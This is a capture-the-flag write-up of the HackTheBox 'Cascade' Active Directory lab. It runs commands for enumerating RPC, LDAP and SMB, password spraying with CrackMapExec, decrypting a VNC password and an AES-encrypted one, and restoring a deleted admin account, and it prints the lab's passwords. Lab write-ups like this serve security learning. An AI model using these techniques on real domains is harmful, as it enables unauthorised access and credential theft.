---
title: HackTheBox - Cascade
date: 2022-06-02 23:00:00
categories: [HackTheBox, Machines]
tags: [hackthebox, cascade, ldap, active_directory, rpc, smb, evil-winrm, vnc, reversing, cryptography]     # TAG names shou>
img_path: /assets/img/HackTheBox/Cascade
---
![Cascade](htb_cascade.png "Cascade")
_HackTheBox Cascade_

**Cascade** is a retired medium **Active Directory** machine on HackTheBox.

---
# Enumeration

Like usual, we can start out by enumerating all the ports and do a more thorough scan of existing ports afterwards.<br>
**Scan:**
```sh
sudo nmap -sS -sC -sV -Pn -vv -p 53,88,135,139,389,445,636,3268,3269,5985,49154,49155,49157,49158,49170 -oN nmap/nmap_initial 10.10.10.182
```
**Results:**
```
Nmap scan report for 10.10.10.182
Host is up, received user-set (0.035s latency).
Scanned at 2022-06-02 18:59:05 IST for 95s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-06-02 17:59:12Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49170/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2022-06-02T18:00:04
|_  start_date: 2022-06-02T17:53:42
|_clock-skew: 0s
| smb2-security-mode:
|   2.1:
|_    Message signing enabled and required
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 58041/tcp): CLEAN (Timeout)
|   Check 2 (port 51409/tcp): CLEAN (Timeout)
|   Check 3 (port 10882/udp): CLEAN (Timeout)
|   Check 4 (port 37793/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

---
# SMB

First stop, checking the anonymous login for SMB.

```sh
smbclient -L \\\\10.10.10.182\\
```
No luck. Moving onto RPC

---
# RPC

```sh
rpcclient -U="" 10.10.10.182 -N
```
![RPC](htb_rpc.png "RPC")
_Success_

Now that we have an anonymous RPC shell, we can run `enumdomusers` to gather a list of users for later password-spraying.<br>
![enumdomusers](htb_enumdomusers.png "enumdomusers")
_enumdomusers_

With this list of users, we can copy it into a file and use `awk` to filter it.<br>
![awk](htb_awk.png "awk")
_users.txt_

Now that we have a list of users, we can move onto LDAP and hopefully find a password.

---
# LDAP

With LDAP, we must first choose a naming context to enumerate:

```sh
ldapsearch -h 10.10.10.182 -x -s base namingcontexts
```
The naming context we're looking for is listed there as `DC=cascade,DC=local`. If we search this naming context without any
additional filter, we'll be given an overwhelming wall of text. We can significantly narrow down the search by targeting
specifically `person` domain objects and saving them to a file for filtering.

```sh
ldapsearch -h 10.10.10.182 -x -b "DC=cascade,DC=local" '(objectClass=person)' > ldapPerson.txt
```

```sh
cat ldapPerson.txt | grep -i "pwd\|pass"
```

![clk0bjVldmE=](htb_b64.png "clk0bjVldmE=")
_clk0bjVldmE=_

We find a Base-64 encoded legacy password. We can easily decode this and use run it against our earlier list of users.

![rY4n5eva](htb_legacypwd.png "rY4n5eva")
_rY4n5eva_

Now that we've got our password, it's time to move onto `CrackMapExec` to see if we've got a hit yet.

```sh
crackmapexec smb 10.10.10.182 -d cascade.local -u users.txt -p "rY4n5eva"
```

![r.thompson](htb_rthompson.png "r.thompson")
_r.thompson_

We've got credentials to enumerate SMB with.

```sh
smbclient -L \\\\10.10.10.182\\ --user="r.thompson"
```

![SMB](htb_smb.png "SMB")
_SMB_

As `r.thompson`, we have permission to explore `\Data`. After some enumerating, we find some files:<br>
```
\\\\10.10.10.182\\Data\\IT\\Email Archives\\Meeting_Notes_June_2018.html
\\\\10.10.10.182\\Data\\IT\\Logs\\Ark AD Recycle Bin\\ArkAdRecycleBin.log
\\\\10.10.10.182\\Data\\IT\\Logs\\DCs\\dcdiag.log
\\\\10.10.10.182\\Data\\IT\\Temp\\s.smith\\VNC Install.reg
```
The email from Steve Smith says an account called `TempAdmin` existed with a password the same as the normal admin password.<br>
![Email](htb_email.png "Email")
_TempAdmin_

This isn't immediately useful but no doubt it will be later. The file most interesting to us right now is<br> 
`VNC Install.reg`.
```
VNC Install.reg
------------------------------------
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
"ExtraPorts"=""
"QueryTimeout"=dword:0000001e
"QueryAcceptOnTimeout"=dword:00000000
"LocalInputPriorityTimeout"=dword:00000003
"LocalInputPriority"=dword:00000000
"BlockRemoteInput"=dword:00000000
"BlockLocalInput"=dword:00000000
"IpAccessControl"=""
"RfbPort"=dword:0000170c
"HttpPort"=dword:000016a8
"DisconnectAction"=dword:00000000
"AcceptRfbConnections"=dword:00000001
"UseVncAuthentication"=dword:00000001
"UseControlAuthentication"=dword:00000000
"RepeatControlAuthentication"=dword:00000000
"LoopbackOnly"=dword:00000000
"AcceptHttpConnections"=dword:00000001
"LogLevel"=dword:00000000
"EnableFileTransfers"=dword:00000001
"RemoveWallpaper"=dword:00000001
"UseD3D"=dword:00000001
"UseMirrorDriver"=dword:00000001
"EnableUrlParams"=dword:00000001
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
"AlwaysShared"=dword:00000000
"NeverShared"=dword:00000000
"DisconnectClients"=dword:00000001
"PollingInterval"=dword:000003e8
"AllowLoopback"=dword:00000000
"VideoRecognitionInterval"=dword:00000bb8
"GrabTransparentWindows"=dword:00000001
"SaveLogToAllUsersPath"=dword:00000000
"RunControlInterface"=dword:00000001
"IdleTimeout"=dword:00000000
"VideoClasses"=""
"VideoRects"=""
```
Inside the file, there's an entry for a hex-encoded password separated by commas. After doing some research on VNC passwords,
we firstly must remove the commas to turn the password from `6b,cf,2a,4b,6e,5a,ca,0f` to `6bcf2a4b6e5aca0f`.
Searching for a tool to help from GitHub, I stumbled upon [vncpwd](https://github.com/jeroennijhof/vncpwd). Echoing the password
straight into `vncpwd` doesn't seem to do anything, we must run it through `xxd` to properly output it as a hexdump. No characters
left behind.
```sh
./vncpwd <(echo "6bcf2a4b6e5aca0f" | xxd -r -ps)
```
```
Password: sT333ve2
```
With this new password, we can run it against `CrackMapExec` again.<br>
![ssmith](htb_ssmith.png "ssmith")
_s.smith_

With our new user, we're afforded new SMB shares but first, we can get an `Evil-WinRM` session to grab the user flag.<br>
![user.txt](htb_user.png "user.txt")
_user.txt_

Now this is where things get interesting.

---
# Root

As well as getting access with `Evil-WinRM`, we were also granted access to additional shares in the SMB, namely `Audit$`.
We can use the following command to recursively download everything in the `Audit$` directory.
```sh
smbclient \\\\10.10.10.182\\Audit$ sT333ve2 --user="s.smith" -c 'prompt;recurse;mget *'
```
This will download everything in the defined share to your current directory. Amongst the files we have downloaded, there
are 4 files of interest:
```
CascAudit.exe  - .Net PE
CascCrypto.dll - Custom Cryptography Library
Audit.db       - SQLite Database
RunAudit.bat   - Batch script to run the executable.
```
`RunAudit.bat` simply contains `CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"` showing us that `CascAudit.exe` takes the 
SQLite DB file as its only argument.<br>

To investigate the `Audit.db` database, we can run:
```sh
sqlite3 Audit.db
```
It's a small enough file so we can coax all we need out of it by running `.dump` inside the SQLite shell. Inside the database
we find an interesting entry:
```
INSERT INTO Ldap VALUES(1,'ArkSvc','BQO5l5Kj9MdErXx6Q6AGOw==','cascade.local');
CREATE TABLE IF NOT EXISTS "Misc" (
        "Id"    INTEGER PRIMARY KEY AUTOINCREMENT,
        "Ext1"  TEXT,
        "Ext2"  TEXT
```
It seems like we've got the `ArkSvc` user and potentially a password encoded in Base-64. Should be easy, right? Simply decode
the Base-64, use it as a password to login to `ArkSvc` and profit? Well, not quite. It is in fact Base-64 but that's not *all* it is.<br>
![b64?](htb_arkpass1.png "b64?")
_D|zC;_

If that value seems too short to be the result of decoding that Base-64, that's because it is. By reversing the operation
and Base-64 encoding `D|zC;`, we're given a very different Base-64 value of `RHx6QzsK`. To confirm there's something more going
on, we can pipe the Base-64 decoded value into `xxd` to see what it really is.<br>
![Encrypted](htb_encrypted.png "Encrypted")
_Encrypted?_

That's a lot of non-printable gibberish. Given the presence of `CascCrypto.dll`, it's safe to assume it's encrypted. What now?
Reversing. I opened up `CascAudit.exe` in `Ghidra`, ready to take a stab at it and...<br>
![GhidNah](htb_ghidnah.png "GhidNah")
_Ghid... Nah_

Absolutely not. That is most definitely not the solution the author of this **medium** machine had in mind. Then I remember
the PE is a .NET assembly. There's tools for that. Tools that'll keep me sane and happy, like `DNSpy`. I zip up the PE and
all its dependencies and bounce it from my Kali-VM to my FLARE-VM to look at it with `DNSpy`.<br>
![DNSpy](htb_dnspy.png "DNSpy")
_That's better_

Instant relief. Readable code. Inside the middle of that screenshot, we have our line of interest:<br>
`password = Crypto.DecryptString(encryptedString, "c4scadek3y654321");`<br>
We've got our decryption key of `c4scadek3y654321`. Now we've got our encrypted value and the key to decrypt it. Now we
just need to find the `DecryptString` function in `CascCrypto.dll` to find out the rest such as algorithm etc.<br>
![DecryptString](htb_decryptstring.png "DecryptString")
_DecryptString_

It's an AES-128 algorithm in `CBC` mode with an `IV` of `1tdyjCbY1Ix49842`. This is all we need to retrieve that password.<br>
![w3lc0meFr31nd](htb_arkpass2.png "w3lc0meFr31nd")
_w3lc0meFr31nd_

Well that was ridiculously satisfying. `ArkSvc:w3lc0meFr31nd`. Time for another round of `CrackMapExec`.<br>
![CrackMapExec](htb_arksvc.png "CrackMapExec")
_ArkSvc_

We're not done yet, this account cannot read the root flag. Throughout this box and even in `Audit.db` that we just used,
there's mention of a deleted TempAdmin account which had the same password as the current Administrator account. In share
`\Data\IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log` we see `CASCADE\ArkSvc` deleting the account. Well, we're now `ArkSvc`,
can we recover it? Of course, the answer is yes:
```powershell
Get-ADObject -Filter:'displayName -eq "TempAdmin"' -IncludeDeletedObjects -property *
```
![TempAdmin](htb_tempadmin1.png "TempAdmin")
_TempAdmin LegacyPwd_

There it is, the recovered password encoded in Base-64 like usual. Just one last decode.
```sh
echo "YmFDVDNyMWFOMDBkbGVz" | base64 -d
```
```
baCT3r1aN00dles
```
With the Administrator password recovered, we can log into `Evil-WinRM` and take the root flag.<br>
![Root](htb_root.png "Root")
_root.txt_

# :)
